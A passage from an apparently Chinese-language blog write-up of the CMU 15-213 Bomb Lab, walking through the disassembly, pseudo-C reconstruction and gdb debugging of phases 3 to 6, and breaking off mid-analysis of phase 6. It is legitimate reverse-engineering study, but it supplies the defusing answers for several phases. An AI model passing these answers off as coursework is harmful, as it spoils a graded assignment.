%eax</code>来确定我们的跳转目标。跳转以后会赋给<code>%eax</code>相应的值，而后我们需要保证我们输入的第二个数等于<code>%eax</code>。</p>\n<p>这样逻辑就捋顺了，整个代码应该是一个<code>switch_case</code>的结构，而<code>0x400f7c</code>就是这个跳转表的首地址，<code>%eax</code>是对应的索引。这个<code>phase</code>的要求就是：</p>\n<ol>\n<li>输入 2 个整数</li>\n<li>第一个整数必须小于等于 0x7，因为最多只有 7 个<code>case</code></li>\n<li>输入的第二个数必须和其<code>case</code>中赋给<code>%eax</code>的值相同</li>\n</ol>\n<p>我们设计第一个数是<code>0</code>，那么第二个数就是<code>0xcf</code>(<code>207</code>)，我们试一试：</p>\n<pre><code>main (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at bomb.c:90\n90          /* I guess this is too easy so far.  Some more complex code will\n(gdb) n\n91           * confuse people. */\n(gdb) n\nHalfway there!\n94          phase_defused();\n</code></pre>\n<p>成功！</p>\n<h2 id=\"phase4-分析：递归\"><a href=\"#phase4-分析：递归\" class=\"headerlink\" title=\"phase4 分析：递归\"></a>phase4 分析：递归</h2><p>首先还是对<code>phase_4</code>进行了反汇编：</p>\n<pre><code>000000000040100c &lt;phase_4&gt;:\n  40100c:\t48 83 ec 18          \tsub    $0x18,%rsp\n  401010:\t48 8d 4c 24 0c       \tlea    0xc(%rsp),%rcx\n  401015:\t48 8d 54 24 08       \tlea    0x8(%rsp),%rdx\n  40101a:\tbe cf 25 40 00       \tmov    $0x4025cf,%esi\n  40101f:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401024:\te8 c7 fb ff ff       \tcallq  400bf0 &lt;__isoc99_sscanf@plt&gt;\n  401029:\t83 f8 02             \tcmp    $0x2,%eax\n  40102c:\t75 07                \tjne    401035 &lt;phase_4+0x29&gt;\n\n  40102e:\t83 7c 24 08 0e       \tcmpl   $0xe,0x8(%rsp)\n  401033:\t76 05                \tjbe    40103a &lt;phase_4+0x2e&gt;\n  401035:\te8 00 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  40103a:\tba 0e 00 00 00       \tmov    $0xe,%edx\n  40103f:\tbe 00 00 00 00       \tmov    $0x0,%esi\n  401044:\t8b 7c 24 08          \tmov    0x8(%rsp),%edi\n  401048:\te8 81 ff ff ff       \tcallq  400fce &lt;func4&gt;\n  40104d:\t85 c0                \ttest   %eax,%eax\n  40104f:\t75 07                \tjne    401058 &lt;phase_4+0x4c&gt;\n  401051:\t83 7c 24 0c 00       \tcmpl   $0x0,0xc(%rsp)\n  401056:\t74 05                \tje     40105d &lt;phase_4+0x51&gt;\n\n  401058:\te8 dd 03 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  40105d:\t48 83 c4 18          \tadd    $0x18,%rsp\n  401061:\tc3                   \tretq\n</code></pre>\n<p>在本代码中进行了如下过程：</p>\n<ol>\n<li>预留出 24 个字节的空间</li>\n<li>rcx &#x3D; rsp + 12</li>\n<li>rdx &#x3D; rsp + 8</li>\n<li>esi &#x3D; 0x4025cf</li>\n<li>eax &#x3D; 0</li>\n<li>sscanf 调用</li>\n<li>下面是带分支部分：</li>\n</ol>\n<pre><code class=\"c\">if(eax != 0x2) &#123;\n    call bomb_explode\n&#125;\nif(arg3 &gt; 0xe) &#123;\n    call bomb_explode\n&#125;\nedx = 0xe;\nesi = 0x0;\nedi = arg3\nret = func4(arg1,arg2,arg3)\nif(eax != 0)\n    call bomb_explode\nif(arg2 == 0)\n    return eax;\nelse\n    call bomb_explode\n</code></pre>\n<p>这里出现了非常熟悉的<code>sscanf</code>调用，我们先看看<code>0x4025cf</code>处是啥（如果不出意外应该是<code>%d %d</code>）</p>\n<pre><code>(gdb) x/s 0x4025cf\n0x4025cf:       &quot;%d %d&quot;\n</code></pre>\n<p>果然！果然！是让我们输入 2 个整数，如果不是两个的话就爆炸！此外，一开始的<code>arg3</code>应该小于等于<code>0xe</code>，否则爆炸，此外函数<code>func4</code>返回的<code>eax</code>应该为 0，否则爆炸。此外，<code>*(rsp + 12)</code>（如果<code>func4</code>里面没改变这个值的话应该还是<code>arg2</code>）必须等于 0。</p>\n<p>那么我们来分析一下<code>func4</code>：</p>\n<pre><code>0000000000400fce &lt;func4&gt;:\n  400fce:\t48 83 ec 08          \tsub    $0x8,%rsp\n  400fd2:\t89 d0                \tmov    %edx,%eax\n  400fd4:\t29 f0                \tsub    %esi,%eax\n  400fd6:\t89 c1                \tmov    %eax,%ecx\n  400fd8:\tc1 e9 1f             \tshr    $0x1f,%ecx\n  400fdb:\t01 c8                \tadd    %ecx,%eax\n  400fdd:\td1 f8                \tsar    %eax\n  400fdf:\t8d 0c 30             \tlea    (%rax,%rsi,1),%ecx\n  400fe2:\t39 f9                \tcmp    %edi,%ecx\n  400fe4:\t7e 0c                \tjle    400ff2 &lt;func4+0x24&gt;\n\n  400fe6:\t8d 51 ff             \tlea    -0x1(%rcx),%edx\n  400fe9:\te8 e0 ff ff ff       \tcallq  400fce &lt;func4&gt;\n  400fee:\t01 c0                \tadd    %eax,%eax\n  400ff0:\teb 15                \tjmp    401007 &lt;func4+0x39&gt;\n\n  400ff2:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  400ff7:\t39 f9                \tcmp    %edi,%ecx\n  400ff9:\t7d 0c                \tjge    401007 &lt;func4+0x39&gt;\n\n  400ffb:\t8d 71 01             \tlea    0x1(%rcx),%esi\n  400ffe:\te8 cb ff ff ff       \tcallq  400fce &lt;func4&gt;\n  401003:\t8d 44 00 01          \tlea    0x1(%rax,%rax,1),%eax\n\n  401007:\t48 83 c4 08          \tadd    $0x8,%rsp\n  40100b:\tc3                   \tretq\n</code></pre>\n<p>看起来有点长，但是不要惊慌！这里只有 3 个跳转，而且其中两个都是跳转到最后恢复栈的位置。其主要步骤如下：</p>\n<ol>\n<li>分配 8 个字节的栈空间</li>\n<li>eax &#x3D; edx</li>\n<li>eax -&#x3D; esi<br>-&gt; eax &#x3D; edx - esi</li>\n<li>ecx &#x3D; eax</li>\n<li>ecx &gt;&gt; 31<br>-&gt; ecx &#x3D; eax &gt;&gt; 31(eax 符号位拉满)</li>\n<li>eax +&#x3D; ecx</li>\n<li>eax &gt;&gt; 1<br>-&gt; eax &#x3D; (eax + ecx) &gt;&gt; 1</li>\n<li>ecx &#x3D; rax + rsi</li>\n<li>下面进入一段分支：</li>\n</ol>\n<pre><code class=\"c\">if(ecx &lt;= edi) &#123;\n    //400ff2\n    eax = 0;\n    if(ecx &gt;= edi) &#123;\n        // 401007\n        return rax;\n    &#125;\n    else&#123;\n        esi = rcx + 0x1;\n        ret = func4(arg1,arg2,arg3)\n        eax = rax + rax + 1;\n        return rax;\n    &#125;\n&#125;\nelse &#123;\n    edx = rcx - 0x1;\n    ret = func4(arg1,arg2,arg3)\n    eax = eax * 2;\n    return rax;\n&#125;\n</code></pre>\n<p>分析<code>func4</code>，我们不难发现，该函数的传入参数是<code>%edx</code>和<code>%esi</code>，此外该函数是个递归函数。函数总的过程应该如下：</p>\n<pre><code class=\"c\">eax = edx - esi\necx = eax &gt;&gt; 31 (逻辑右移)\neax = (eax + ecx) &gt;&gt; 1 (算数右移)\necx = rax + rsi\nif(ecx &lt;= edi) &#123;\n   eax = 0;\n   if(ecx &gt;= edi) &#123;\n       // 401007\n       return rax;\n   &#125;\n   else&#123;\n       esi = rcx + 0x1;\n       ret = func4(arg1,arg2,arg3)\n       eax = rax * 2 + 1;\n       return rax;\n   &#125;\n&#125;\nelse &#123;\n   edx = rcx - 0x1;\n   ret = func4(arg1,arg2,arg3)\n   eax = eax * 2;\n   return rax;\n&#125;\n</code></pre>\n<p>经过变量调整重写的 C 版本如下：</p>\n<pre><code class=\"c\">ret = arg3 - arg2\nmid = ret &gt;&gt; 31\nret = (ret + ret &gt;&gt; 31) / 2;\nmid = ret + arg2\nif(mid &lt;= arg1) &#123;\n   ret = 0;\n   if(mid &gt;= arg1) &#123;\n       return ret;\n   &#125;\n   else&#123;\n    //    arg2 = mid + 1;\n       return func4(arg1,mid + 1,arg3) * 2 + 1;\n   &#125;\n&#125;\nelse &#123;\n//    arg3 = mid - 1;\n   return func4(arg1,arg2,mid - 1) * 2;\n&#125;\n</code></pre>\n<p>我们看看什么情况下<code>eax = 0</code>。（这到底是什么东西啊摔！）真没看懂是什么东西，试了个<code>0 0</code>，通过了，先 mark 一下，后面再来检验：</p>\n<pre><code>(gdb)\n0 0\n95          printf(&quot;Halfway there!\\n&quot;);\n</code></pre>\n<h2 id=\"phase5-分析-canary，循环与-ASCII-编码字符串\"><a href=\"#phase5-分析-canary，循环与-ASCII-编码字符串\" class=\"headerlink\" title=\"phase5 分析: canary，循环与 ASCII 编码字符串\"></a>phase5 分析: <code>canary</code>，循环与 ASCII 编码字符串</h2><pre><code>(gdb)\n97          /* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */\n</code></pre>\n<p>数学不好呜呜呜。</p>\n<p>phase_5 的反汇编代码如下：</p>\n<pre><code>0000000000401062 &lt;phase_5&gt;:\nseg1:\n  401062:\t53                   \tpush   %rbx\n  401063:\t48 83 ec 20          \tsub    $0x20,%rsp\n  401067:\t48 89 fb             \tmov    %rdi,%rbx\n  40106a:\t64 48 8b 04 25 28 00 \tmov    %fs:0x28,%rax\n  401071:\t00 00\n  401073:\t48 89 44 24 18       \tmov    %rax,0x18(%rsp)\n  401078:\t31 c0                \txor    %eax,%eax\n  40107a:\te8 9c 02 00 00       \tcallq  40131b &lt;string_length&gt;\n  40107f:\t83 f8 06             \tcmp    $0x6,%eax\n  401082:\t74 4e                \tje     4010d2 &lt;phase_5+0x70&gt;\n  401084:\te8 b1 03 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  401089:\teb 47                \tjmp    4010d2 &lt;phase_5+0x70&gt;\nseg2:\n  40108b:\t0f b6 0c 03          \tmovzbl (%rbx,%rax,1),%ecx\n  40108f:\t88 0c 24             \tmov    %cl,(%rsp)\n  401092:\t48 8b 14 24          \tmov    (%rsp),%rdx\n  401096:\t83 e2 0f             \tand    $0xf,%edx\n  401099:\t0f b6 92 b0 24 40 00 \tmovzbl 0x4024b0(%rdx),%edx\n  4010a0:\t88 54 04 10          \tmov    %dl,0x10(%rsp,%rax,1)\n  4010a4:\t48 83 c0 01          \tadd    $0x1,%rax\n  4010a8:\t48 83 f8 06          \tcmp    $0x6,%rax\n  4010ac:\t75 dd                \tjne    40108b &lt;phase_5+0x29&gt;\n  4010ae:\tc6 44 24 16 00       \tmovb   $0x0,0x16(%rsp)\n  4010b3:\tbe 5e 24 40 00       \tmov    $0x40245e,%esi\n  4010b8:\t48 8d 7c 24 10       \tlea    0x10(%rsp),%rdi\n  4010bd:\te8 76 02 00 00       \tcallq  401338 &lt;strings_not_equal&gt;\n  4010c2:\t85 c0                \ttest   %eax,%eax\n  4010c4:\t74 13                \tje     4010d9 &lt;phase_5+0x77&gt;\n  4010c6:\te8 6f 03 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  4010cb:\t0f 1f 44 00 00       \tnopl   0x0(%rax,%rax,1)\n  4010d0:\teb 07                \tjmp    4010d9 &lt;phase_5+0x77&gt;\nseg3:\n  4010d2:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  4010d7:\teb b2                \tjmp    40108b &lt;phase_5+0x29&gt;\nseg4:\n  4010d9:\t48 8b 44 24 18       \tmov    0x18(%rsp),%rax\n  4010de:\t64 48 33 04 25 28 00 \txor    %fs:0x28,%rax\n  4010e5:\t00 00\n  4010e7:\t74 05                \tje     4010ee &lt;phase_5+0x8c&gt;\n  4010e9:\te8 42 fa ff ff       \tcallq  400b30 &lt;__stack_chk_fail@plt&gt;\nseg5:\n  4010ee:\t48 83 c4 20          \tadd    $0x20,%rsp\n  4010f2:\t5b                   \tpop    %rbx\n  4010f3:\tc3                   \tretq\n</code></pre>\n<p>整个过程还原为 C 语言如下：</p>\n<pre><code class=\"c\">// 这个函数的参数是： %rdi\nint phase5(char* buf)\n&#123;\n    // 保存 rbx\n    // 留出 32 个字节的空间\n    rbx = rdi // buf 的地址保存在 rbx 中\n    *(rsp + 24) = canary\n    eax = 0 // 返回值 = 0\n    call string_length // 返回字符串长度\n    if(eax == 0x6) &#123;\n        eax = 0\n\n        // //seg2\n        // ecx = *(rbx + rax)\n        // *rsp = cl\n        // rdx = *rsp\n        // edx = edx &amp; 0xf\n        // edx = *(rdx + 0x4024b0)\n        // *(rsp + rax + 16) = dl\n        // rax = rax &amp; 0x1\n        // if(rax != 0x6)\n        // \tjump to seg2\n\n        // seg2 应该是个循环，其格式如下：\n        do &#123;\n            ecx = *(rbx + rax) -&gt; 把(str+i)指向的4个字节赋给ecx\n            *rsp = cl -&gt; rsp指向处存储ecx的最低一个字节\n            rdx = *rsp -&gt; rdx = 最低的那个字节\n            edx = edx &amp; 0xf -&gt; edx = 最低4位\n            edx = *(rdx + 0x4024b0) -&gt; edx = *(最低四位 + 0x4024b0)\n            *(rsp + rax + 16) = dl -&gt; rsp[i + 16] = edx的最低四位\n            rax = rax + 0x1 -&gt; rax 递增\n        &#125;while(rax != 0x6);\n\n        *(rsp + 22) = 0 -&gt; rsp[22] = 0 // 字符串的末尾是`\\0`\n        esi = 0x40245e\n        rdi = rsp + 16\n        call strings_not_equal // 判断 esi处的字符串和 rsp + 16处的6个字节的字符串是否相等\n        if(eax == 0) &#123;\n            // seg4\n            rax = *(rsp + 24) // canary\n            // compare rax and canary\n            if(rax == canary) &#123;\n                //seg5\n                // release the stack\n                return rax;\n            &#125;\n            else &#123;\n                call __stack_chk_fail\n            &#125;\n        &#125;else &#123;\n            call bomb_explode\n        &#125;\n    &#125;\n    else &#123;\n        call bomb_explode\n    &#125;\n&#125;\n</code></pre>\n<p><code>0x40245e</code>处的字符串如下：</p>\n<pre><code>(gdb) x/s 0x40245e\n0x40245e:       &quot;flyers&quot;\n</code></pre>\n<p>从上面的内容中我们可以看出：</p>\n<ol>\n<li>必须输入 6 个字符长度的字符串，否则炸弹爆炸</li>\n<li><code>rsp + 16</code>处的字符串和<code>0x40245e</code>处的字符串<code>flyers</code>相同。</li>\n<li>我们需要计算一下 seg2 那段到底对字符串做了什么操作：<code>edx的值 = *(0x4024b0 + str[i]的最低4位)</code>，然后<code>str[i] = edx最低四位</code></li>\n<li>最后<code>str</code>需要等于<code>flyers</code>，也就是说<code>*(0x4024b0 + str[i]的最低4位)的最低4位 = flyers</code></li>\n</ol>\n<p>其中<code>flyers</code>的编码为：<code>0x40245e:       0x66    0x6c    0x79    0x65    0x72    0x73    0x00</code>，最后一个<code>0x00</code>在程序中手动设置了，所以无需自己设置。</p>\n<p>打印一下<code>0x4024b0</code>开始的字符串：<code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code></p>\n<p>因此，本题的目的是在<code>0x4024b0</code>开始的字符串中拼凑出<code>flyers</code>，然后把每个字符相对于开头的偏移量计算出来。其几个字符的地址分别是：</p>\n<ol>\n<li><code>f</code>:0x09</li>\n<li><code>l</code>:0x0f</li>\n<li><code>y</code>:0x0e</li>\n<li><code>ers</code>:0x05 0x06 0x07</li>\n</ol>\n<p>综合起来是：<code>0x09 0x0f 0x0e 0x05 0x06 0x07</code>。我们来试一下<code>*(0x4024b0 + str[i]的最低4位)</code>是否等于<code>flyers</code>。测试出来是这样的。但是这 6 个字节不是字符，为了凑成字符，我们对每个数字加上 64（因为在计算的时候只取最低 4 位，所以对一个字节加上 64 不影响最后的偏移量），得到<code>73, 79,78, 69, 70, 71</code>(这里是 10 进制)，其对应的 ASCII 码是<code>IONEFG</code>。</p>\n<h2 id=\"phase6-分析-超级无敌杂糅嵌套多层循环\"><a href=\"#phase6-分析-超级无敌杂糅嵌套多层循环\" class=\"headerlink\" title=\"phase6 分析: 超级无敌杂糅嵌套多层循环\"></a>phase6 分析: 超级无敌杂糅嵌套多层循环</h2><p>phase_6 反汇编如下（哎哟我滴妈呀咋个这么长啊）：</p>\n<pre><code>00000000004010f4 &lt;phase_6&gt;:\nseg1:\n  4010f4:\t41 56                \tpush   %r14\n  4010f6:\t41 55                \tpush   %r13\n  4010f8:\t41 54                \tpush   %r12\n  4010fa:\t55                   \tpush   %rbp\n  4010fb:\t53                   \tpush   %rbx\n  4010fc:\t48 83 ec 50          \tsub    $0x50,%rsp\n  401100:\t49 89 e5             \tmov    %rsp,%r13\n  401103:\t48 89 e6             \tmov    %rsp,%rsi\n  401106:\te8 51 03 00 00       \tcallq  40145c &lt;read_six_numbers&gt;\n  40110b:\t49 89 e6             \tmov    %rsp,%r14\n  40110e:\t41 bc 00 00 00 00    \tmov    $0x0,%r12d\nseg2:\n  401114:\t4c 89 ed             \tmov    %r13,%rbp\n  401117:\t41 8b 45 00          \tmov    0x0(%r13),%eax\n  40111b:\t83 e8 01             \tsub    $0x1,%eax\n  40111e:\t83 f8 05             \tcmp    $0x5,%eax\n  401121:\t76 05                \tjbe    401128 &lt;phase_6+0x34&gt;\n  401123:\te8 12 03 00 00       \tcallq  40143a &lt;explode_bomb&gt;\nseg3:\n  401128:\t41 83 c4 01          \tadd    $0x1,%r12d\n  40112c:\t41 83 fc 06          \tcmp    $0x6,%r12d\n  401130:\t74 21                \tje     401153 &lt;phase_6+0x5f&gt;\n  401132:\t44 89 e3             \tmov    %r12d,%ebx\nseg4:\n  401135:\t48 63 c3             \tmovslq %ebx,%rax\n  401138:\t8b 04 84             \tmov    (%rsp,%rax,4),%eax\n  40113b:\t39 45 00             \tcmp    %eax,0x0(%rbp)\n  40113e:\t75 05                \tjne    401145 &lt;phase_6+0x51&gt;\n  401140:\te8 f5 02 00 00       \tcallq  40143a &lt;explode_bomb&gt;\nseg5:\n  401145:\t83 c3 01             \tadd    $0x1,%ebx\n  401148:\t83 fb 05             \tcmp    $0x5,%ebx\n  40114b:\t7e e8                \tjle    401135 &lt;phase_6+0x41&gt;\n  40114d:\t49 83 c5 04          \tadd    $0x4,%r13\n  401151:\teb c1                \tjmp    401114 &lt;phase_6+0x20&gt;\nseg6:\n  401153:\t48 8d 74 24 18       \tlea    0x18(%rsp),%rsi\n  401158:\t4c 89 f0             \tmov    %r14,%rax\n  40115b:\tb9 07 00 00 00       \tmov    $0x7,%ecx\nseg7:\n  401160:\t89 ca                \tmov    %ecx,%edx\n  401162:\t2b 10                \tsub    (%rax),%edx\n  401164:\t89 10                \tmov    %edx,(%rax)\n  401166:\t48 83 c0 04          \tadd    $0x4,%rax\n  40116a:\t48 39 f0             \tcmp    %rsi,%rax\n  40116d:\t75 f1                \tjne    401160 &lt;phase_6+0x6c&gt;\n  40116f:\tbe 00 00 00 00       \tmov    $0x0,%esi\n  401174:\teb 21                \tjmp    401197 &lt;phase_6+0xa3&gt;\nseg8:\n  401176:\t48 8b 52 08          \tmov    0x8(%rdx),%rdx\n  40117a:\t83 c0 01             \tadd    $0x1,%eax\n  40117d:\t39 c8                \tcmp    %ecx,%eax\n  40117f:\t75 f5                \tjne    401176 &lt;phase_6+0x82&gt;\n  401181:\teb 05                \tjmp    401188 &lt;phase_6+0x94&gt;\nseg9:\n  401183:\tba d0 32 60 00       \tmov    $0x6032d0,%edx\nseg10:\n  401188:\t48 89 54 74 20       \tmov    %rdx,0x20(%rsp,%rsi,2)\n  40118d:\t48 83 c6 04          \tadd    $0x4,%rsi\n  401191:\t48 83 fe 18          \tcmp    $0x18,%rsi\n  401195:\t74 14                \tje     4011ab &lt;phase_6+0xb7&gt;\nseg11:\n  401197:\t8b 0c 34             \tmov    (%rsp,%rsi,1),%ecx\n  40119a:\t83 f9 01             \tcmp    $0x1,%ecx\n  40119d:\t7e e4                \tjle    401183 &lt;phase_6+0x8f&gt;\n  40119f:\tb8 01 00 00 00       \tmov    $0x1,%eax\n  4011a4:\tba d0 32 60 00       \tmov    $0x6032d0,%edx\n  4011a9:\teb cb                \tjmp    401176 &lt;phase_6+0x82&gt;\nseg12:\n  4011ab:\t48 8b 5c 24 20       \tmov    0x20(%rsp),%rbx\n  4011b0:\t48 8d 44 24 28       \tlea    0x28(%rsp),%rax\n  4011b5:\t48 8d 74 24 50       \tlea    0x50(%rsp),%rsi\n  4011ba:\t48 89 d9             \tmov    %rbx,%rcx\nseg13:\n  4011bd:\t48 8b 10             \tmov    (%rax),%rdx\n  4011c0:\t48 89 51 08          \tmov    %rdx,0x8(%rcx)\n  4011c4:\t48 83 c0 08          \tadd    $0x8,%rax\n  4011c8:\t48 39 f0             \tcmp    %rsi,%rax\n  4011cb:\t74 05                \tje     4011d2 &lt;phase_6+0xde&gt;\n  4011cd:\t48 89 d1             \tmov    %rdx,%rcx\n  4011d0:\teb eb                \tjmp    4011bd &lt;phase_6+0xc9&gt;\nseg14:\n  4011d2:\t48 c7 42 08 00 00 00 \tmovq   $0x0,0x8(%rdx)\n  4011d9:\t00\n  4011da:\tbd 05 00 00 00       \tmov    $0x5,%ebp\nseg15:\n  4011df:\t48 8b 43 08          \tmov    0x8(%rbx),%rax\n  4011e3:\t8b 00                \tmov    (%rax),%eax\n  4011e5:\t39 03                \tcmp    %eax,(%rbx)\n  4011e7:\t7d 05                \tjge    4011ee &lt;phase_6+0xfa&gt;\n  4011e9:\te8 4c 02 00 00       \tcallq  40143a &lt;explode_bomb&gt;\nseg16:\n  4011ee:\t48 8b 5b 08          \tmov    0x8(%rbx),%rbx\n  4011f2:\t83 ed 01             \tsub    $0x1,%ebp\n  4011f5:\t75 e8                \tjne    4011df &lt;phase_6+0xeb&gt;\n  4011f7:\t48 83 c4 50          \tadd    $0x50,%rsp\n  4011fb:\t5b                   \tpop    %rbx\n  4011fc:\t5d                   \tpop    %rbp\n  4011fd:\t41 5c                \tpop    %r12\n  4011ff:\t41 5d                \tpop    %r13\n  401201:\t41 5e                \tpop    %r14\n  401203:\tc3                   \tretq   s\n</code></pre>\n<p>我们将其分为 16 个 seg，然后绘制一下函数流程图试试，总体过程如图</p>\n<p><img data-src=\"/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/phase6.png\" alt=\"图\">。</p>\n<p>然后，我们为了减小每步分析的工作量，根据跳转分支将其分为 6 个过程，如图</p>\n<p><img data-src=\"/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/segs.png\" alt=\"图\"></p>\n<p>下面我们对这 6 个过程来进行分析：</p>\n<h3 id=\"Proc-1\"><a href=\"#Proc-1\" class=\"headerlink\" title=\"Proc 1\"></a>Proc 1</h3><p>首先进入的是 seg1，其做的工作是：</p>\n<ol>\n<li>压入<code>r14 r13 r12 rbp rbx</code></li>\n<li>留出 80 个字节的空间</li>\n<li><code>r13 = rsp = rsi</code></li>\n<li>调用<code>call_six_numbers</code>，经前文分析，<code>read_six_numbers</code>的传入参数为<code>%rsi</code>，返回值在<code>%eax</code>中，其存储了读入的数字的个数</li>\n<li><code>r14 = rsp = rsi = r13</code>，<code>r12d = 0</code></li>\n</ol>\n<p>下面进入 seg 2，其做的工作是：</p>\n<ol>\n<li>让<code>rbp = r13</code>，那么现在<code>r13 = r14 = rsi = rsp = rbp</code></li>\n<li>让<code>eax = r13所指向的值</code></li>\n<li>判断<code>eax - 1</code>是否小于等于 5，如果<code>eax - 1 &gt; 5</code>，那么炸弹爆炸，也就是说<code>eax</code>必须小于等于 6</li>\n<li>正常情况下，进入 seg 3</li>\n</ol>\n<p>进入 seg 3 分析：</p>\n<ol>\n<li><code>r12d += 1</code></li>\n<li>将<code>r12d</code>与 6 比较，如果<code>r12d ！= 6</code>，那么<code>ebx = r12d</code>，随后进入 seg 4(proc 2 中)</li>\n<li>否则就进入 seg 6(proc 3 中)</li>\n</ol>\n<p>这里我们分析得到的结果是：</p>\n<ol>\n<li>seg 1 中进行了一些初始化的工作，让几个指针都指向输入数字的起始位置，并且让计数值<code>r12d = 0</code></li>\n<li>seg 2 中让<code>rbp 指向 r13所指向的位置</code>(一开始<code>r13 = r14 = rsp = rsi</code>，因为后面还有进入<code>seg 2</code>的部分，所以不确定<code>r13</code>的指向会不会改变，先看看)，让<code>eax = r13所指向的值</code>，并且保证其必须小于等于 6</li>\n<li>seg 3 中让<code>r12d</code>计数值增加，判断<code>r12d是否等于6</code>。如果不等于 6，就让其等于<code>ebx</code>，然后进入<code>seg 4</code>；否则进<code>seg 6</code>（看流程图可以看出，seg 6 离终点要更进一步，而 seg 4 在进入后做一些循环的工作后又会回到 seg 2，故我猜测这里 seg 4 以后的步骤是做了一些遍历的工作，但是在遍历的而过程中是读还是修改暂不清楚）</li>\n</ol>\n<h3 id=\"Proc-2\"><a href=\"#Proc-2\" class=\"headerlink\" title=\"Proc 2\"></a>Proc 2</h3><p>接下来我们进入 seg 4：</p>\n<ol>\n<li>我们首先让<code>rax = ebx</code>(注意前面<code>ebx = r12d</code>,此时<code>r12d</code>已经递增到下一个位置了)，那么这里<code>rax = ebx = r12d</code></li>\n<li>让<code>eax = *(rsp + 4 * rax)</code>，因为 rsp 是输入数字的起始位置，那么 rax 应该是一个索引，因为输入的是<code>int</code>类型，所以每次要 <code>* 4</code>。假定输入的数字的字符串叫<code>str</code>，那么这里就是<code>eax = str[rax]</code></li>\n<li>判断<code>rbp 指向的值是否等于eax</code>，前文中我们可以看到<code>rbp</code>指向的是<code>r13</code>所指向的位置，也就是让你判断<code>r13</code>指向位置的值是否等于<code>eax</code>，也就是前面的<code>str[rax]</code></li>\n<li>如果不相等，进入 seg 5，否则炸弹爆炸(下面那个图中的有点错误，菱锌框中应该是不相等)，我们可以初步判断，这里两个相邻的值应该是不能相等的（其他不相邻的能不能相等等会儿再看，如果<code>r13</code>改变的话，那么不相邻的值应该也不能像等）</li>\n</ol>\n<p>就接下来我们进入 seg 5：</p>\n<ol>\n<li><code>ebx += 1</code>（还记得<code>ebx</code>是什么吗？<code>ebx = r12d</code>！在前文中<code>r12d</code>已经向前跃进了一个位置，那么现在<code>ebx</code>还要比<code>r12d</code>再进一个位置）</li>\n<li>将<code>ebx 和 0x5</code>相比较，如果<code>ebx &lt;= 0x5</code>，也就是说如果之前的<code>ebx &lt;= 0x6</code>的话，继续回到 seg 4。否则<code>r13 += 4</code>（<code>r13</code>果然改变了，向前跃进了 4 个字节，也就是一个 int 类型的大小），然后回到 seg 2</li>\n</ol>\n<p>这个过程我们分析得到的结果是：</p>\n<ol>\n<li>seg 4 让<code>rax = ebx = r12d</code>，然后让<code>rax = str[rax]</code>，判断<code>rbp/r13</code>指向的值是否等于<code>eax</code>。相等就爆炸，不相等就进 seg 5</li>\n<li>seg 5 判断之前的<code>ebx</code>是否小于等于 0x6，<code>r12d</code>比<code>ebx</code>小 1。如果<code>ebx &lt;= 0x6</code>的话，回到 seg 4。seg 4 中还要判断下一个位置的数字和<code>r13/rbp</code>所指向的数字是否相等，相等就爆炸。否则<code>r13</code>指向下一个数字的位置，回到 seg 2。seg 2 中又要判断下一个数字是否小于等于 6，以及其和后面的数字是否相等。</li>\n</ol>\n<blockquote>\n<p>到这里我们可以初步判断，r13&#x2F;rbp 是用于指向被比较的基准数，是指针。ebx&#x2F;r12d 是用来递增的数组索引，是数字。获取到的数字通常被赋给 rax。输入的数字不能有相等的，也必须都小于等于 6。Proc 1 和 Proc 2 主要执行了一些检查的工作。</p>\n</blockquote>\n<h3 id=\"Proc-3\"><a href=\"#Proc-3\" class=\"headerlink\" title=\"Proc 3\"></a>Proc 3</h3><blockquote>\n<p>从前文我们可以判断出，当进入 seg 6 的时候，r12d 肯定是等于 6 了，r13&#x2F;rbp 也指向了最后一个数字。</p>\n</blockquote>\n<p>在 seg 6 中：</p>\n<ol>\n<li>我们让<code>rsi</code>指向最后一个数字的下一个位置，让<code>rax = r14</code>,<code>ecx = 7</code>（<code>r14</code>一开始是指向<code>rsp</code>的，这两个值是什么含义这里还没有完全清楚）</li>\n</ol>\n<p>在 seg 7 中：</p>\n<ol>\n<li>我们让<code>edx = ecx</code>（<code>edx = ecx = 7</code>）</li>\n<li><code>edx = edx - *rax</code>，这里<code>rax</code>指向数组的开头，也就是让<code>edx</code>作为 7 和<code>rax</code>指向的当前值的差</li>\n<li><code>*rax = edx</code>，也就是让<code>rax</code>指向的值 &#x3D; 这个差</li>\n<li><code>rax</code>指向下一个位置，比较<code>rax</code>和<code>rsi</code>，也就是判断是否到达了数组的末尾</li>\n<li>如果没有到达（<code>rax</code>还没有到达数组末尾<code>rsi</code>），就回到 seg 7，继续让每个数组的值 &#x3D; 7 - 它的值</li>\n<li>否则 <code>esi = 0</code>，跳到<code>seg 11</code></li>\n</ol>\n<blockquote>\n<p>在这个子过程中，我们让每个数组的值都等于 7-它原本的值，遍历完成后 rax 指向数组末尾，r14 和 rsp 还在开头，esi &#x3D; 0</p>\n</blockquote>\n<h3 id=\"Proc-4\"><a href=\"#Proc-4\" class=\"headerlink\" title=\"Proc 4\"></a>Proc 4</h3><blockquote>\n<p>这个过程有点复杂，要慢慢来</p>\n</blockquote>\n<p>在 seg 11 中：</p>\n<ol>\n<li>我们让<code>ecx的值 = *(rsp + rsi)</code></li>\n<li>将<code>ecx</code>和 <code>0x1</code> 比较，如果<code>ecx &lt;= 0x1</code>的话，跳转到 seg 9</li>\n<li>否则 eax &#x3D; 1, edx &#x3D; <code>0x6032d0</code>，跳转到 seg 